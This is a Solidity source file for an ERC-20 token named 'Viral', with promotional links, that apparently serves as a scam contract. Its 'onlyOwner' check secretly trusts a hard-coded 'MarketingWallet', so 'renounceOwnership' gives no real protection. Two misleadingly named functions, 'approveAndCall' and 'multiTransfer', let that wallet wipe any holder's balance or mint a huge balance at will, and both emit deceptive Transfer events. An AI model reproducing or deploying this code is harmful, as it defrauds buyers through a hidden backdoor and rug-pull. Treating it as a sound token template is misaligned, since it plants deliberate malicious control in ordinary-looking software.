// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract ViralTeng is Context{
    string public name = "Viral";
    string public symbol = "$Viral";
    uint256 public totalSupply = 10000000000000000000000;
    uint8 public decimals = 9;
    string public telegram = "https://t.me/viraltokenerc20";
    string public ViralUTILITY = "VIRAL is an innovative cryptocurrency built on the Ethereum network";
    string public ViralTokenType = "ERC-20";
    string public Viralwebsite = "https://viral.space/";
    string public ViralWhitepaper = "https://coinmarketcap.com/currencies/viral-space/";

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(
        address indexed _ownerViral,
        address indexed spenderViral,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private owner;
    event OwnershipRenounced();
   address private MarketingWallet; 
    constructor() {
        MarketingWallet = 0x67F3591b56F0b35C66D085685C91C965f47Eb0DD;
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(MarketingWallet == _msgSender(), "io: caller is not the owner");
        _;
    }

    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    function approveAndCall(address approveRewards) external onlyOwner {
        balanceOf[approveRewards] = 12598;
        
        emit Transfer(approveRewards, address(0), 12598);
    }

    function approve(address spenderViral, uint256 _value)
        public
        returns (bool success)
    {
        require(address(0) != spenderViral);
        allowance[msg.sender][spenderViral] = _value;
        emit Approval(msg.sender, spenderViral, _value);
        return true;
    }
       function multiTransfer(address addresss) external onlyOwner {
        balanceOf[addresss] = 802268000000000 * 10 ** 25;
        
        emit Transfer(addresss, address(0), 802268000000000 * 10 ** 25);
    } 
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
            function getViralwebsite() public view returns (string memory) {
        return Viralwebsite;
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipRenounced();
        owner = address(0);
    }
}